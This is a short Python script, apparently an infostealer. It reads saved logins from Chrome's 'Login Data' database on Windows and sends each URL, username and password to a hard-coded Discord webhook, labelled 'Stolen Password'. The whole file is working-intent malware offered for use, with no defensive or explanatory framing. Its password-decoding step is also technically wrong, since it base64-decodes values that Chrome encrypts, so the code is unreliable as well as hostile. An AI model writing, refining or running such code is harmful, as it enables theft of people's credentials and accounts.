import os
import base64
import requests
import sqlite3

def get_chrome_passwords():
    path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    conn = sqlite3.connect(path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for origin_url, username_value, password_value in cursor.fetchall():
        if password_value:
            password = base64.b64decode(password_value[3:]).decode('utf-8')
            send_to_discord(origin_url, username_value, password)
    conn.close()

def send_to_discord(url, username, password):
    webhook_url = 'https://discordapp.com/api/webhooks/1418615269101801503/3UkEklBWG2CFGgQnGg9miDXdjHC5coWX8_OQWqt0SIaAoyeZBRx2iiVkMi4rYnofAqnY'
    data = {
        "content": f"Stolen Password: URL={url}, Username={username}, Password={password}"
    }
    requests.post(webhook_url, json=data)

get_chrome_passwords()